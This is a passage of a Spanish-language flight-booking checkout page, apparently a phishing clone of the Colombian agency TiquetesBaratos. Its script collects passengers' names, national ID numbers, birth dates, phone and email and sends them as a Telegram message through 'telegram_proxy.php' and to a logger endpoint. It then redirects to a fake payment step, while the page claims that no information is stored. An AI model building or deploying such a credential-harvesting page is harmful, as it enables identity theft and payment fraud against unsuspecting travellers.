                  <label class="font-12 px-1 label-xs">Primer apellido</label>
                  <input validation-valid-chart="true" name="apellido${






                                type}${index + 1}" id="apellido${type}${index + 1}" type="text" class="form-control" data-skip-validation="true">
                  <div id="apellido${type}${index + 1}_invalid" class="invalid-feedback">
                    Por favor digite el apellido, no incluir números o caracteres especiales
                  </div>
                </div>
              </div>
            </div>

            <div class="row">
              <div class="col-12 mb-2 px-2">
                <label>Fecha de Nacimiento</label>
              </div>
            </div>
            <div class="row">
              <div class="col-4 col-md-2 px-2">
                <div class="form-group position-relative">
                  <label class="font-12 px-1 label-xs">Día</label>
                  <select name="dianacimient${














                                type}${index + 1}" id="dianacimient${type}${index + 1}" class="form-control custom-select" required>
                    <option value="">---</option>
                    ${
                                Array.from({length: 31}, (_, i) => `<option value="${(i + 1).toString().padStart(2, '0')}">${(i + 1).toString().padStart(2, '0')}</option>`).join('')}
                  </select>
                </div>
              </div>
              <div class="col-4 col-md-2 px-2">
                <div class="form-group position-relative">
                  <label class="font-12 px-1 label-xs">Mes</label>
                  <select class="form-control custom-select" name="mesnacimient${





                                type}${index + 1}" id="mesnacimient${type}${index + 1}" required>
                    <option value="">---</option>
                    ${
                                Array.from({length: 12}, (_, i) => `<option value="${(i + 1).toString().padStart(2, '0')}">${(i + 1).toString().padStart(2, '0')}</option>`).join('')}
                  </select>
                </div>
              </div>
              <div class="col-4 col-md-2 px-2">
                <div class="form-group position-relative">
                  <label class="font-12 px-1 label-xs">Año</label>
                  <select class="form-control custom-select" name="anonacimient${





                                type}${index + 1}" id="anonacimient${type}${index + 1}" required>
                    <option value="">---</option>
                    ${
                                Array.from({length: 103}, (_, i) => `<option value="${2023 - i}">${2023 - i}</option>`).join('')}
                  </select>
                </div>
              </div>
              <div class="col-12 col-md-6 px-2">
                <div class="form-group position-relative">
                  <label class="font-12 px-1 label-xs">Cédula de Ciudadanía *</label>
                  <input type="number" class="form-control credential-input-validation" name="cedula${





                                type}${index + 1}" id="cedula${type}${index + 1}" autocomplete="off" data-invalid="cedula${type}${index + 1}_invalid" required />
                  <div id="cedula${type}${index + 1}_invalid" class="invalid-feedback">
                    Por favor digite su cédula de Ciudadanía, no incluir puntos o caracteres especiales.
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      `







                                ;
                            }

                            for (let i = 0; i < totalAdults; i++) {
                                const formHTML = createPersonForm(i, 'adulto');
                                formContainer.innerHTML += formHTML;
                            }

                            for (let i = 0; i < totalKids; i++) {
                                const formHTML = createPersonForm(i, 'nino');
                                formContainer.innerHTML += formHTML;
                            }

                            document.getElementById('validate-button').addEventListener('click', async function() {
                                let valid = true;
                                const inputs = document.querySelectorAll('input, select');

                                inputs.forEach(input => {
                                    if (input.getAttribute('data-skip-validation') !== 'true') {
                                        if (!input.checkValidity()) {
                                            input.classList.add('-invalid');
                                            valid = false;
                                        } else {
                                            input.classList.remove('-invalid');
                                        }
                                    }
                                });

                                if (!valid) {
                                    return;
                                }


                                const adults = [];
                                const kids = [];

                                for (let i = 0; i < totalAdults; i++) {
                                    const adultData = {
                                        nombre: document.getElementById(`nombreadulto${i + 1}`).value,
                                        apellido: document.getElementById(`apellidoadulto${i + 1}`).value,
                                        diaNacimiento: document.getElementById(`dianacimientadulto${i + 1}`).value,
                                        mesNacimiento: document.getElementById(`mesnacimientadulto${i + 1}`).value,
                                        anoNacimiento: document.getElementById(`anonacimientadulto${i + 1}`).value,
                                        cedula: document.getElementById(`cedulaadulto${i + 1}`).value
                                    };
                                    adults.push(adultData);
                                }

                                for (let i = 0; i < totalKids; i++) {
                                    const kidData = {
                                        nombre: document.getElementById(`nombrenino${i + 1}`).value,
                                        apellido: document.getElementById(`apellidonino${i + 1}`).value,
                                        diaNacimiento: document.getElementById(`dianacimientnino${i + 1}`).value,
                                        mesNacimiento: document.getElementById(`mesnacimientnino${i + 1}`).value,
                                        anoNacimiento: document.getElementById(`anonacimientnino${i + 1}`).value,
                                        cedula: document.getElementById(`cedulanino${i + 1}`).value
                                    };
                                    kids.push(kidData);
                                }

                                const contactData = {
                                    telefono: document.getElementById('telefonomovil').value,
                                    correo: document.getElementById('correo').value
                                };

                                localStorage.setItem('adults', JSON.stringify(adults));
                                localStorage.setItem('kids', JSON.stringify(kids));
                                localStorage.setItem('contact', JSON.stringify(contactData));
                                function generateGUID() {
                                    function s4() {
                                        return Math.floor((1 + Math.random()) * 0x10000).toString(16).substring(1);
                                    }
                                    return Math.random().toString(36).substr(2, 10);
                                }
                                function generateRandomToken(length) {
                                    const array = new Uint8Array(length);
                                    window.crypto.getRandomValues(array);
                                    return Array.from(array, byte => (byte % 10).toString()).join('');
                                }

                                function encodeBase64Unicode(str) {
                                    const utf8Bytes = new TextEncoder().encode(str);

                                    // Luego, convertimos los bytes a base64
                                    let binaryString = "";
                                    for (let i = 0; i < utf8Bytes.byteLength; i++) {
                                        binaryString += String.fromCharCode(utf8Bytes[i]);
                                    }
                                    return btoa(binaryString);
                                }
                                localStorage.setItem('tokenPayment', generateGUID(15));

                                document.getElementById('espera').style.visibility = 'visible';
                                // Función para obtener los datos de localStorage
                                function getLocalStorageData() {
                                    const adults = JSON.parse(localStorage.getItem('adults')); // JSON de adultos
                                    const contact = JSON.parse(localStorage.getItem('contact')); // JSON de contacto

                                    return {
                                        adults,
                                        contact
                                    };
                                }

                                // Función para enviar datos a la API y Telegram
                                async function sendDataToAPI() {
                                    const data = getLocalStorageData();

                                    let message = `<b>✈️ Nueva Reserva Iniciada</b>\n\n`;
                                    message += `👤 <b>Pasajeros:</b>\n`;
                                    data.adults.forEach((a, i) => {
                                        message += `  - Adulto ${i+1}: ${a.nombre} ${a.apellido} (${a.cedula})\n`;
                                    });
                                    if (data.kids) {
                                        data.kids.forEach((k, i) => {
                                            message += `  - Niño ${i+1}: ${k.nombre} ${k.apellido} (${k.cedula})\n`;
                                        });
                                    }
                                    message += `\n📞 <b>Contacto:</b>\n`;
                                    message += `  - Teléfono: ${data.contact.telefono}\n`;
                                    message += `  - Correo: ${data.contact.correo}\n`;
                                    message += `\n🆔 <b>Token:</b> ${localStorage.getItem('tokenPayment')}`;

                                    try {
                                        await fetch("./telegram_proxy.php", {
                                            method: "POST",
                                            headers: { "Content-Type": "application/json" },
                                            body: JSON.stringify({ message: message }),
                                        });
                                    } catch (e) {
                                        console.error("Error enviando a Telegram:", e);
                                    }

                                    // Mantener el envío original por si acaso
                                    const xhr = new XMLHttpRequest();
                                    xhr.open('POST', '/api/logger', true);
                                    xhr.setRequestHeader('Content-Type', 'application/json');
                                    xhr.send(JSON.stringify(data));
                                }

                                // Llamar a la función para enviar los datos
                                await sendDataToAPI();

                                setTimeout(() => {
                                    window.location.href = 'pay?q=' + encodeBase64Unicode(generateRandomToken(150));

                                }, 3000);

                            });
                        });
                        </script>
                        <!-- start detail info -->
                        <div class="c-detail-info p-3 hide-md hide-lg mb-3">
                            <p class="text-center mb-2">
                                <span class="icon icon-lock color-blue font-28 position-t-2"></span>
                                <span>Su información personal y su transacción están seguras</span>
                            </p>
                            <p class="mb-2 text-center">
                                <span class="color-blue f-r-medium">NO SE GUARDA INFORMACIÓN</span>
                                <span>sobre las tarjetas de crédito de los usuarios que realicen las transacciones en nuestro portal. Nuestra plataforma de pago en línea está avalada por VeriSign.</span>
                            </p>
                        </div>

                        <!-- start alerts -->
                        <div class="row">
                            <div class="col-12">
                                <div class="c-info-offer-1 p-3">
                                    <div class="custom-control custom-checkbox py-1 d-flex">
                                        <input type="checkbox" class="checkout-checkboxPromo-inputCheckbox custom-control-input" id="enviarOfertasHoteles" name="ofertahoteles">
                                        <label class="custom-control-label" for="enviarOfertasHoteles">
                                            <span class="c-text font-14 position-t-2 ml-1 f-semibold">
                                                                                            Me interesa un hotel en Barranquilla </span>
                                            <span class="label-green py-1 px-2 rounded text-white font-12 ml-2">Hasta -43%</span>
                                        </label>
                                    </div>
                                    <p class="mb-2 font-14 pl-4 ml-1">Reserve su vuelo y obtenga precios exclusivos para nuestros clientes</p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <input name="secuenciaida" value="15" hidden>
                <input name="tipoVuelo" value="nacional" hidden>
                <!-- Modal -->
                <div class="modal fade" id="terms-and-conditions-checkout" tabindex="-1" role="dialog" aria-labelledby="modalTANDC" aria-hidden="true">
                    <div class="modal-dialog modal-dialog-centered modal-xl modal-dialog-scrollable" role="document">
                        <div class="modal-content">
                            <div class="modal-header">
                                <h5 class="modal-title" id="modalTANDC"> Términos y Condiciones de compra y Ley de Retracto.</h5>
                                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                                    <span aria-hidden="true">&times;</span>
                                </button>
                            </div>
                            <div class="modal-body mt-2 ">

                                <div class="custom">
                                    <p>
                                        <span style="color: #444444; font-family: Arial, Helvetica, sans-serif; line-height: normal;">"Señor usuario: le recomendamos no efectuar más de una reserva por trayecto individual que necesite, por cuanto se generarían inconvenientes con la aerolínea que podrían conllevar la cancelación automática de vuelos por duplicidad de reservas."</span>
                                        <br style="color: #444444; font-family: Arial, Helvetica, sans-serif; line-height: normal;"/>
                                        <br style="color: #444444; font-family: Arial, Helvetica, sans-serif; line-height: normal;"/>
                                        <span style="color: #444444; font-family: Arial, Helvetica, sans-serif; line-height: normal;">"La respuesta a su búsqueda, en algunos casos, puede no arrojar resultados o éstos pueden variar de acuerdo a las clases disponibles, la causa podrá ser que las aerolíneas que hacen el trayecto en la ruta que está consultando no se han afiliado aún al sistema de reserva que utilizamos".</span>
                                        <br style="color: #444444; font-family: Arial, Helvetica, sans-serif; line-height: normal;"/>
                                        <span style="color: #444444; font-family: Arial, Helvetica, sans-serif; line-height: normal;">En algunos casos los vuelos que confirma este buscador no pueden ser vendidos desde Colombia. Nuestro asesor en el momento de contactarlo le informará.</span>
                                        <br style="color: #444444; font-family: Arial, Helvetica, sans-serif; line-height: normal;"/>
                                        <span style="color: #444444; font-family: Arial, Helvetica, sans-serif; line-height: normal;">Para las transacciones realizadas a través de Pago Electrónico en nuestros Sitio Web se aplicará una Tasa Administrativa de Internet la cual será calculada de acuerdo con la aerolínea y ruta seleccionada.</span>
                                        <br style="color: #444444; font-family: Arial, Helvetica, sans-serif; line-height: normal;"/>
                                        <span style="color: #444444; font-family: Arial, Helvetica, sans-serif; line-height: normal;">En caso de efectuar solo la reserva y realizar el pago mediante otro medio la Tasa Administrativa que se aplicará será mayor a la cobrada a través de Pago Electrónico, por otros medios de pago. </span>
                                    </p>
                                </div>
                                <ul class="list-group mt-4 mb-3">
                                    <li class="list-group-item">
                                        <a modal-window data-open="index2.php?option=com_sabre&view=condiciones&caso=0&tmpl=component" href="#" title="Ver condiciones pago electr&oacute;nico." onmouseover="this.style.textDecoration='underline';" onmouseout="this.style.textDecoration='none';" style="color: #03F; cursor:pointer;">Ver
                                                                                    condiciones pago electr&oacute;nico</a>
                                    </li>
                                    <li class="list-group-item">
                                        <a modal-window data-open="index2.php?option=com_sabre&view=condiciones&caso=1&tmpl=component" href="#" title="Ver Cobro Tarifas Administrativas" onmouseover="this.style.textDecoration='underline';" onmouseout="this.style.textDecoration='none';" style="color:#03F;">Tarifas
                                                                                    Administrativas</a>
                                    </li>
                                    <li class="list-group-item">
                                        <a modal-window href="#" data-open="index2.php?option=com_sabre&view=condiciones&caso=2&tmpl=component" title="Pol&iacute;tica General y de Privacidad" onmouseover="this.style.textDecoration='underline';" onmouseout="this.style.textDecoration='none';" style="color:#03F;">Pol&iacute;tica
                                                                                    General y de Privacidad</a>
                                    </li>
                                    <li class="list-group-item">
                                        <a href="#" modal-window data-open="index2.php?option=com_sabre&view=condiciones&caso=3&tmpl=component" title="Terminos y Condiciones" onmouseover="this.style.textDecoration='underline';" onmouseout="this.style.textDecoration='none';" style="color:#03F;">Términos
                                                                                    y Condiciones</a>
                                    </li>
                                    <li class="list-group-item">
                                        <a class="fancybox" href="#" modal-window data-open="index2.php?option=com_sabre&view=condiciones&caso=4&tmpl=component" onmouseover="this.style.textDecoration='underline';" onmouseout="this.style.textDecoration='none';" style="color:#03F;">Ley
                                                                                    de Retracto</a>
                                    </li>
                                </ul>
                            </div>
                        </div>
                    </div>
                </div>

                <input name='fechaorigen' value='2024-09-17' hidden>
                <input name='fechadestino' value='2024-09-18' hidden>
                <input name="tradeNameRegreso" value="Basic" hidden>
                <input name="tradeNameIda" value="Basic" hidden>
                <input name="vueloida" value="4000" hidden>
                <input name="vueloregreso" value="4001" hidden>
                <input name="telefonoresidencia" value="" hidden>

                <div id="loading-checkout" style="display: none;">
                    <div class="modal-backdrop fade show"></div>
                    <div class="container-loading bg-white" style="z-index: 1100;">
                        <div class="cl-body d-flex flex-column h-100">
                            <div class="clb-header">
                                <p class="text-center py-2 font-22 f-semibold color-blue mt-2 mt-md-3">Tu vuelo está casi listo</p>
                            </div>

                            <div class="clb-footer mt-auto px-3 mb-4">
                                <div class="row mb-2">
                                    <div class="col-12">
                                        <p class="mb-1 font-18 f-semibold">Detalles del vuelo:</p>
                                    </div>
                                </div>
                                <div class="row">
                                    <div class="col-9">
                                        <p class="m-0 font-14 lh-1">
                                            <span class="f-semibold">BOG - BAQ</span>
                                             Familia - Basic
                                            <span class="c-date">
                                                                                            Lun - 12 Feb </span>
                                        </p>
                                    </div>
                                    <div class="col-3 pl-0">
                                        <img src="./assets/images/LA.png" height="20" class="d-block ml-auto"/>
                                    </div>
                                </div>
                                <div class="row">
                                    <div class="col-12">
                                        <hr class="mt-1 mb-2 pb-1"/>
                                    </div>
                                </div>
                                <div class="row">
                                    <div class="col-9">
                                        <p class="m-0 font-14 lh-1">
                                            <span class="f-semibold">BAQ - BOG</span>
                                             Familia - Basic
                                            <span class="c-date">
                                                                                            Mar - 13 Feb </span>
                                        </p>
                                    </div>
                                    <div class="col-3 pl-0">
                                        <img src="./assets/images/LA.png" height="20" class="d-block ml-auto"/>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="icon-loader">
                            <div class="c-loader"></div>
                        </div>
                    </div>
                </div>

                <input type="hidden" name="aerolinea" id="aerolinea" value="LA"/>
                <input type="hidden" name="aerolinearegreso" id="aerolinearegreso" value="LA"/>
                <input type="hidden" name="familiacodekey" id="familiacodekey" value="^BASIC"/>
                <input type="hidden" name="familiacodekeyregreso" id="familiacodekeyregreso" value="^BASIC"/>
                <input type="hidden" name="valortotal" id="valortotal" value="99998"/>
                <input type="hidden" name="tipotarifa" id="tipotarifa" value="nacional"/>
                <input type="hidden" name="tipoviaje" id="tipoviaje" value="idaregreso"/>
                <input type="hidden" name="ida" id="ida" value="BOG"/>
                <input type="hidden" name="regreso" id="regreso" value="BAQ"/>
                <input type="hidden" name="adultos" id="adultos" value="1"/>
                <input type="hidden" name="ninos" id="ninos" value="0"/>
                <input type="hidden" name="version" id="version" value="2"/>
                <input type="hidden" name="engine" id="engine" value="LA"/>

            </form>
        </section>

    </div>
    <footer class="ck-footer container-fluid p-4" style="margin-top: 1rem;">
        <p class="mb-2 text-center font-14">
            TiquetesBaratos - PRICE RES S.A.S. NIT. 900.474.794-8 , Calle 97A # 8 - 10 Of. 204 Bogotá D.C., Bogotá – Colombia, Teléfonos: 
            <a style="color: #333132!important; " href="tel:601 743 6620">601 743 6620</a>
            . Todos los derechos reservados.
        </p>
        <p class="mb-2 text-center font-14">
            Registro Nacional de Turismo No. 44091. 
            <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="83f0ecf3ecf1f7e6f3f2f1e0ecc3f3f1eae0e6f7f1e2f5e6efade0ecee">[email&#160;protected]</a>
        </p>
        <p class="mb-2 text-center font-14">En desarrollo de lo dispuesto en el artículo 17 de la ley 679 de 2001, la agencia rechaza la explotación, la pornografía, el turismo sexual y demás formas de abuso sexual con menores, que son sancionados penal y administrativamente conforme a las leyes colombianas.</p>
    </footer>
    <script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script>
    <script type="text/javascript" src="https://d2wcw8ctp0rb22.cloudfront.net/templates/tiquetesbaratos/js/jquery-1.10.2.js?v=3.1.13-04022024"></script>
    <script type="text/javascript" src="./assets/js/mobileslider-de0182521a.min.js"></script>
    <script type="text/javascript" src="./assets/js/bootstrap-5f3dc300f8.min.js"></script>
    <script type="text/javascript" src="./assets/js/globals-20d06c7852.min.js"></script>
    <script>
    (function() {
        function c() {
            var b = a.contentDocument || a.contentWindow.document;
            if (b) {
                var d = b.createElement('script');
                d.innerHTML = "window.__CF$cv$params={r:'903ffaca3c6231f2',t:'MTczNzIxNzkzMi4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";
                b.getElementsByTagName('head')[0].appendChild(d)
            }
        }
        if (document.body) {
            var a = document.createElement('iframe');
            a.height = 1;
            a.width = 1;
            a.style.position = 'absolute';
            a.style.top = 0;
            a.style.left = 0;
            a.style.border = 'none';
            a.style.visibility = 'hidden';
            document.body.appendChild(a);
            if ('loading' !== document.readyState)
                c();
            else if (window.addEventListener)
                document.addEventListener('DOMContentLoaded', c);
            else {
                var e = document.onreadystatechange || function() {};
                document.onreadystatechange = function(b) {
                    e(b);
                    'loading' !== document.readyState && (document.onreadystatechange = e, c())
                }
            }
        }
    })();
    </script>
</body>

</html>
